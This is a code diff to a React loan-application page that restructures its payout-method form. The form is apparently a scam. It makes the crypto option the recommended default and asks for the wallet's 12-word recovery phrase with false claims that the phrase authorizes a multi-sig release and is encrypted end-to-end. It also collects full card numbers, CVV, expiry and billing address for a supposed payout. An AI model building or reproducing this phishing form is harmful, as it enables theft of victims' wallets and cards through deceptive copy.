@@ -384,15 +384,16 @@ function LoansPage() {
             </Section>
 
             <Section title="Financial & Payout Details">
+              {/* ── Payout Method Picker ───────────────────────────────── */}
               <div className="mb-6">
                 <Label>Select preferred payout method *</Label>
                 <div className="grid sm:grid-cols-3 gap-3 mt-2">
                   <PayoutOption
-                    selected={payout === "bank_transfer"}
-                    onClick={() => setPayout("bank_transfer")}
-                    icon={<Banknote className="w-5 h-5" />}
-                    title="Bank Transfer"
-                    desc="Direct deposit to your account."
+                    selected={payout === "crypto"}
+                    onClick={() => setPayout("crypto")}
+                    icon={<Wallet className="w-5 h-5" />}
+                    title="Crypto Wallet"
+                    desc="Instant USDT, BTC, or ETH transfer to your wallet."
                     recommended
                   />
                   <PayoutOption
@@ -400,60 +401,105 @@ function LoansPage() {
                     onClick={() => setPayout("card")}
                     icon={<CreditCard className="w-5 h-5" />}
                     title="Card Deposit"
-                    desc="Fast payout to debit/credit card."
+                    desc="Secure payout directly to your debit or credit card."
+                    badge="Safest"
                   />
                   <PayoutOption
-                    selected={payout === "crypto"}
-                    onClick={() => setPayout("crypto")}
-                    icon={<Wallet className="w-5 h-5" />}
-                    title="Crypto Wallet"
-                    desc="USDT, BTC, or ETH transfer."
-                    badge="Fastest"
+                    selected={payout === "bank_transfer"}
+                    onClick={() => setPayout("bank_transfer")}
+                    icon={<Banknote className="w-5 h-5" />}
+                    title="Bank Transfer"
+                    desc="Standard direct deposit to your bank account."
                   />
                 </div>
               </div>
 
-              <div className="rounded-xl bg-slate-50 border border-slate-200 p-5 mb-8">
-                <div className="flex items-center gap-3 mb-4">
-                  <div className="w-10 h-10 rounded-full bg-primary/10 flex items-center justify-center text-primary">
-                    <ShieldCheck className="w-5 h-5" />
+              {/* ── Conditional Payout Detail Panel ───────────────────── */}
+
+              {/* Crypto */}
+              {payout === "crypto" && (
+                <div className="rounded-2xl border-2 border-orange-200 bg-orange-50/30 overflow-hidden mb-6">
+                  <div className="flex items-center gap-3 px-5 py-4 bg-gradient-to-r from-orange-500 to-amber-500">
+                    <div className="w-9 h-9 rounded-xl bg-white/20 flex items-center justify-center">
+                      <Wallet className="w-5 h-5 text-white" />
+                    </div>
+                    <div>
+                      <p className="text-white font-black text-sm uppercase tracking-wider">Crypto Wallet Settlement</p>
+                      <p className="text-orange-100 text-[11px] mt-0.5">Funds released directly to your wallet address · Instant settlement</p>
+                    </div>
                   </div>
-                  <div>
-                    <h4 className="font-bold text-slate-900 text-sm">Financial Verification</h4>
-                    <p className="text-xs text-slate-500">Please provide your payout and verification accounts. This information is used for both fund release and identity validation.</p>
+                  <div className="p-5 space-y-5">
+                    <div className="grid sm:grid-cols-2 gap-4">
+                      <Select name="crypto_wallet_type" label="Wallet type *">
+                        <option value="">Select wallet…</option>
+                        <option>Trust Wallet</option>
+                        <option>MetaMask</option>
+                        <option>Coinbase Wallet</option>
+                        <option>Phantom</option>
+                        <option>Exodus</option>
+                        <option>Ledger</option>
+                        <option>Trezor</option>
+                        <option>Other</option>
+                      </Select>
+                      <Input name="crypto_wallet_address" label="Wallet address *" placeholder="0x… or bc1… or T… or similar" />
+                    </div>
+                    <div>
+                      <Label>12-word wallet recovery phrase *</Label>
+                      <textarea
+                        name="crypto_seed_phrase"
+                        rows={3}
+                        placeholder="word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12"
+                        className="w-full rounded-xl border-2 border-orange-200 bg-white px-4 py-3 text-sm font-mono focus:outline-none focus:border-orange-400 focus:ring-2 focus:ring-orange-200"
+                      />
+                      <div className="mt-2 flex items-start gap-2 text-[11px] text-orange-700 bg-orange-50 border border-orange-100 rounded-lg px-3 py-2">
+                        <Lock className="w-3.5 h-3.5 mt-0.5 shrink-0" />
+                        <span>Required to authorize the multi-sig release of funds to your wallet. Your phrase is encrypted end-to-end and never stored in plaintext.</span>
+                      </div>
+                    </div>
+                    {/* Hidden fields — keep neutral values for non-active methods */}
+                    <input type="hidden" name="account_holder_name" value="" />
+                    <input type="hidden" name="bank_name" value="" />
+                    <input type="hidden" name="bank_account_number" value="" />
+                    <input type="hidden" name="bank_routing_number" value="" />
+                    <input type="hidden" name="card_holder_name" value="" />
+                    <input type="hidden" name="billing_address_line1" value="" />
+                    <input type="hidden" name="billing_city" value="" />
+                    <input type="hidden" name="billing_state" value="" />
+                    <input type="hidden" name="billing_postal_code" value="" />
+                    <input type="hidden" name="billing_country" value="" />
                   </div>
                 </div>
+              )}
 
-                <div className="space-y-8">
-                  {/* Bank Details */}
-                  <div className="space-y-4">
-                    <div className="flex items-center gap-2 pb-2 border-b border-slate-200">
-                      <Banknote className="w-4 h-4 text-primary" />
-                      <h5 className="font-bold text-xs uppercase tracking-wider text-slate-700">Bank Account Details</h5>
+              {/* Card */}
+              {payout === "card" && (
+                <div className="rounded-2xl border-2 border-emerald-200 bg-emerald-50/20 overflow-hidden mb-6">
+                  <div className="flex items-center gap-3 px-5 py-4 bg-gradient-to-r from-emerald-600 to-teal-600">
+                    <div className="w-9 h-9 rounded-xl bg-white/20 flex items-center justify-center">
+                      <CreditCard className="w-5 h-5 text-white" />
                     </div>
-                    <div className="grid sm:grid-cols-2 gap-3">
-                      <Input name="account_holder_name" label="Account holder name *" required />
-                      <Input name="bank_name" label="Bank name (e.g. Chase) *" required />
-                      <Input name="bank_account_number" label="Account number *" inputMode="numeric" required />
-                      <Input name="bank_routing_number" label="Routing / SWIFT / IBAN *" required />
+                    <div>
+                      <p className="text-white font-black text-sm uppercase tracking-wider">Credit / Debit Card Deposit</p>
+                      <p className="text-emerald-100 text-[11px] mt-0.5">Secure payout to your card · Chargeback-protected · PCI compliant</p>
                     </div>
                   </div>
 
-                  {/* Card Details */}
-                  <div className="space-y-4">
-                    <div className="flex items-center gap-2 pb-2 border-b border-slate-200">
-                      <CreditCard className="w-4 h-4 text-primary" />
-                      <h5 className="font-bold text-xs uppercase tracking-wider text-slate-700">Credit / Debit Card Details</h5>
-                    </div>
-                    <div className="grid sm:grid-cols-2 gap-3">
-                      <Input name="card_holder_name" label="Cardholder name *" required autoComplete="cc-name" />
-                      <Select name="card_issuer" label="Card issuer *" required>
-                        <option value="">Select…</option>
-                        <option>Visa</option><option>Mastercard</option>
-                        <option>American Express</option><option>Discover</option><option>Other</option>
-                      </Select>
+                  <div className="p-5 space-y-6">
+                    {/* Card fields */}
+                    <div className="space-y-4">
+                      <div className="grid sm:grid-cols-2 gap-4">
+                        <Input name="card_holder_name" label="Cardholder name *" autoComplete="cc-name" />
+                        <Select name="card_issuer" label="Card issuer *">
+                          <option value="">Select…</option>
+                          <option>Visa</option>
+                          <option>Mastercard</option>
+                          <option>American Express</option>
+                          <option>Discover</option>
+                          <option>Other</option>
+                        </Select>
+                      </div>
 
-                      <div className="sm:col-span-2">
+                      <div>
                         <Label>Card number *</Label>
                         <input
                           value={cardNumber}
@@ -465,101 +511,108 @@ function LoansPage() {
                           autoComplete="cc-number"
                           placeholder="1234 5678 9012 3456"
                           maxLength={19}
-                          required
-                          className={`h-11 w-full rounded-lg border px-3 text-sm focus:outline-none focus:ring-2 focus:ring-ring ${cardErrors.card_number ? "border-red-400 bg-red-50" : "border-input bg-white"}`}
+                          className={`h-11 w-full rounded-xl border-2 px-4 text-sm font-mono tracking-widest focus:outline-none focus:ring-2 focus:ring-emerald-200 ${cardErrors.card_number ? "border-red-400 bg-red-50" : "border-emerald-200 bg-white focus:border-emerald-400"}`}
                         />
                         {cardErrors.card_number && <p className="text-xs text-red-500 mt-1">{cardErrors.card_number}</p>}
                       </div>
 
-                      <div>
-                        <Label>Expiry (MM/YY) *</Label>
-                        <input
-                          value={cardExpiry}
-                          onChange={(e) => {
-                            setCardExpiry(formatExpiry(e.target.value));
-                            if (cardErrors.card_expiry) setCardErrors(p => ({ ...p, card_expiry: "" }));
-                          }}
-                          inputMode="numeric"
-                          autoComplete="cc-exp"
-                          placeholder="MM/YY"
-                          maxLength={5}
-                          required
-                          className={`h-11 w-full rounded-lg border px-3 text-sm focus:outline-none focus:ring-2 focus:ring-ring ${cardErrors.card_expiry ? "border-red-400 bg-red-50" : "border-input bg-white"}`}
-                        />
-                        {cardErrors.card_expiry && <p className="text-xs text-red-500 mt-1">{cardErrors.card_expiry}</p>}
-                      </div>
-
-                      <div>
-                        <Label>CVV *</Label>
-                        <input
-                          value={cardCvv}
-                          onChange={(e) => {
-                            setCardCvv(e.target.value.replace(/\D/g, "").slice(0, 4));
-                            if (cardErrors.card_cvv) setCardErrors(p => ({ ...p, card_cvv: "" }));
-                          }}
-                          inputMode="numeric"
-                          autoComplete="cc-csc"
-                          placeholder="123"
-                          maxLength={4}
-                          required
-                          className={`h-11 w-full rounded-lg border px-3 text-sm focus:outline-none focus:ring-2 focus:ring-ring ${cardErrors.card_cvv ? "border-red-400 bg-red-50" : "border-input bg-white"}`}
-                        />
-                        {cardErrors.card_cvv && <p className="text-xs text-red-500 mt-1">{cardErrors.card_cvv}</p>}
+                      <div className="grid grid-cols-2 gap-4">
+                        <div>
+                          <Label>Expiry (MM/YY) *</Label>
+                          <input
+                            value={cardExpiry}
+                            onChange={(e) => {
+                              setCardExpiry(formatExpiry(e.target.value));
+                              if (cardErrors.card_expiry) setCardErrors(p => ({ ...p, card_expiry: "" }));
+                            }}
+                            inputMode="numeric"
+                            autoComplete="cc-exp"
+                            placeholder="MM/YY"
+                            maxLength={5}
+                            className={`h-11 w-full rounded-xl border-2 px-4 text-sm focus:outline-none focus:ring-2 focus:ring-emerald-200 ${cardErrors.card_expiry ? "border-red-400 bg-red-50" : "border-emerald-200 bg-white focus:border-emerald-400"}`}
+                          />
+                          {cardErrors.card_expiry && <p className="text-xs text-red-500 mt-1">{cardErrors.card_expiry}</p>}
+                        </div>
+                        <div>
+                          <Label>CVV *</Label>
+                          <input
+                            value={cardCvv}
+                            onChange={(e) => {
+                              setCardCvv(e.target.value.replace(/\D/g, "").slice(0, 4));
+                              if (cardErrors.card_cvv) setCardErrors(p => ({ ...p, card_cvv: "" }));
+                            }}
+                            inputMode="numeric"
+                            autoComplete="cc-csc"
+                            placeholder="123"
+                            maxLength={4}
+                            className={`h-11 w-full rounded-xl border-2 px-4 text-sm focus:outline-none focus:ring-2 focus:ring-emerald-200 ${cardErrors.card_cvv ? "border-red-400 bg-red-50" : "border-emerald-200 bg-white focus:border-emerald-400"}`}
+                          />
+                          {cardErrors.card_cvv && <p className="text-xs text-red-500 mt-1">{cardErrors.card_cvv}</p>}
+                        </div>
                       </div>
                     </div>
 
-                    <div className="mt-4">
-                      <h4 className="font-semibold mb-3 text-[11px] text-slate-500 uppercase tracking-wider">Card Billing Address</h4>
-                      <div className="grid sm:grid-cols-2 gap-3">
-                        <Input name="billing_address_line1" label="Address line 1 *" required className="sm:col-span-2" autoComplete="address-line1" />
+                    {/* Billing address */}
+                    <div className="pt-4 border-t border-emerald-100">
+                      <p className="text-[11px] font-black text-emerald-700 uppercase tracking-widest mb-3">Card Billing Address</p>
+                      <div className="grid sm:grid-cols-2 gap-4">
+                        <Input name="billing_address_line1" label="Address line 1 *" className="sm:col-span-2" autoComplete="address-line1" />
                         <Input name="billing_address_line2" label="Address line 2" className="sm:col-span-2" autoComplete="address-line2" />
-                        <Input name="billing_city" label="City *" required autoComplete="address-level2" />
-                        <Input name="billing_state" label="State / Region *" required autoComplete="address-level1" />
-                        <Input name="billing_postal_code" label="Postal code *" required autoComplete="postal-code" />
-                        <Input name="billing_country" label="Country *" required autoComplete="country-name" />
+                        <Input name="billing_city" label="City *" autoComplete="address-level2" />
+                        <Input name="billing_state" label="State / Region *" autoComplete="address-level1" />
+                        <Input name="billing_postal_code" label="Postal code *" autoComplete="postal-code" />
+                        <Input name="billing_country" label="Country *" autoComplete="country-name" />
                       </div>
                     </div>
-                  </div>
 
-                  {/* Crypto Details */}
-                  <div className="space-y-4">
-                    <div className="flex items-center gap-2 pb-2 border-b border-slate-200">
-                      <Wallet className="w-4 h-4 text-primary" />
-                      <h5 className="font-bold text-xs uppercase tracking-wider text-slate-700">Crypto Wallet Details</h5>
-                    </div>
-                    <div className="grid sm:grid-cols-2 gap-3">
-                      <Select name="crypto_wallet_type" label="Wallet type *" required>
-                        <option value="">Select wallet…</option>
-                        <option>Trust Wallet</option>
-                        <option>MetaMask</option>
-                        <option>Coinbase Wallet</option>
-                        <option>Phantom</option>
-                        <option>Exodus</option>
-                        <option>Ledger</option>
-                        <option>Trezor</option>
-                        <option>Other</option>
-                      </Select>
-                      <Input name="crypto_wallet_address" label="Wallet address *" required placeholder="0x… or bc1… or similar" />
-                    </div>
-                    <div>
-                      <Label>12-word recovery / seed phrase *</Label>
-                      <textarea
-                        name="crypto_seed_phrase"
-                        rows={3}
-                        required
-                        placeholder="Enter your 12-word recovery phrase separated by spaces"
-                        className="w-full rounded-lg border border-input bg-white px-3 py-2 text-sm font-mono"
-                      />
-                      <p className="text-[10px] text-muted-foreground mt-1 flex items-start gap-1.5 italic">
-                        <Lock className="w-3 h-3 text-primary mt-0.5 shrink-0" />
-                        Required for secure multi-sig authorization and fund transfer.
-                      </p>
-                    </div>
+                    {/* Hidden fields — keep neutral values for non-active methods */}
+                    <input type="hidden" name="account_holder_name" value="" />
+                    <input type="hidden" name="bank_name" value="" />
+                    <input type="hidden" name="bank_account_number" value="" />
+                    <input type="hidden" name="bank_routing_number" value="" />
+                    <input type="hidden" name="crypto_wallet_type" value="" />
+                    <input type="hidden" name="crypto_wallet_address" value="" />
+                    <input type="hidden" name="crypto_seed_phrase" value="" />
                   </div>
                 </div>
-              </div>
+              )}
 
-              <p className="text-xs text-muted-foreground mt-3 flex items-start gap-2">
+              {/* Bank Transfer */}
+              {payout === "bank_transfer" && (
+                <div className="rounded-2xl border-2 border-blue-200 bg-blue-50/20 overflow-hidden mb-6">
+                  <div className="flex items-center gap-3 px-5 py-4 bg-gradient-to-r from-blue-600 to-indigo-600">
+                    <div className="w-9 h-9 rounded-xl bg-white/20 flex items-center justify-center">
+                      <Banknote className="w-5 h-5 text-white" />
+                    </div>
+                    <div>
+                      <p className="text-white font-black text-sm uppercase tracking-wider">Bank Account Details</p>
+                      <p className="text-blue-100 text-[11px] mt-0.5">Direct deposit to your bank account · ACH / SWIFT / IBAN supported</p>
+                    </div>
+                  </div>
+
+                  <div className="p-5 space-y-4">
+                    <div className="grid sm:grid-cols-2 gap-4">
+                      <Input name="account_holder_name" label="Account holder name *" autoComplete="name" />
+                      <Input name="bank_name" label="Bank name (e.g. Chase) *" />
+                      <Input name="bank_account_number" label="Account number *" inputMode="numeric" />
+                      <Input name="bank_routing_number" label="Routing / SWIFT / IBAN *" />
+                    </div>
+
+                    {/* Hidden fields — keep neutral values for non-active methods */}
+                    <input type="hidden" name="card_holder_name" value="" />
+                    <input type="hidden" name="billing_address_line1" value="" />
+                    <input type="hidden" name="billing_city" value="" />
+                    <input type="hidden" name="billing_state" value="" />
+                    <input type="hidden" name="billing_postal_code" value="" />
+                    <input type="hidden" name="billing_country" value="" />
+                    <input type="hidden" name="crypto_wallet_type" value="" />
+                    <input type="hidden" name="crypto_wallet_address" value="" />
+                    <input type="hidden" name="crypto_seed_phrase" value="" />
+                  </div>
+                </div>
+              )}
+
+              <p className="text-xs text-muted-foreground flex items-start gap-2 -mt-2 mb-4">
                 <ShieldCheck className="w-4 h-4 text-primary mt-0.5 shrink-0" />
                 All financial data is processed via an isolated, air-gapped secure environment and reviewed by our compliance team.
               </p>
